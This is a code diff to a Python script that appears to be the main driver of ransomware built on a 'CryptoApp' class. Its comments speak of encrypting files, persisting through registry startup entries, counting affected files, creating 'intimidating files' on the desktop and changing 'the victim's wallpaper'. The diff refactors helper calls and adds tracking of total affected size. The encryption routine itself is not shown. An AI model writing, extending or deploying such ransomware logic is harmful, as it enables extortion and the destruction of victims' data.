@@ -1,10 +1,9 @@
 from CryptoApp import CryptoApp
 import os
 import json
-from operator import itemgetter
+import utils as fn
 from sys import argv
 from typing import Optional
-import utils as fn
 
 
 
@@ -52,7 +51,7 @@ if __name__ == '__main__':
         APP.registryStartupAction(target_os, 'stop', initScript)
 
         # Remove every extra file that was created during encryption (on desktop)
-        fn.removeGlobFiles(desktop_path, extra_files_name)
+        APP.removeAdditionalFiles(desktop_path, extra_files_name)
 
         # If decrypted successfully, handle the JSON file
         # And set the old wallpaper if possible
@@ -68,10 +67,10 @@ if __name__ == '__main__':
         APP.registryStartupAction(target_os, 'start', initScript)
 
         # Get the total number of modified files and directories
-        files_num, dirs_num = APP.getCount()
+        files_num, dirs_num, total_size = APP.getAffectedFilesInfo()
 
         # Save some informations to a JSON file
-        asJSON: dict = fn.saveInfoToJSON(target_os, target_de, dirs_num, files_num)
+        asJSON: dict = fn.saveInfoToJSON(target_os, target_de, dirs_num, files_num, total_size)
 
         # Get the current wallpaper
         # And save it to JSON
@@ -89,7 +88,7 @@ if __name__ == '__main__':
         APP.writeFile(JSON_PATH, j)
 
         # Create on Desktop some intimidating files
-        fn.createGlobFiles(APP, desktop_path, extra_files_name)
+        APP.createAdditionalFiles(desktop_path, extra_files_name, 'Hello!')
 
 
     # Change the victim's wallpaper
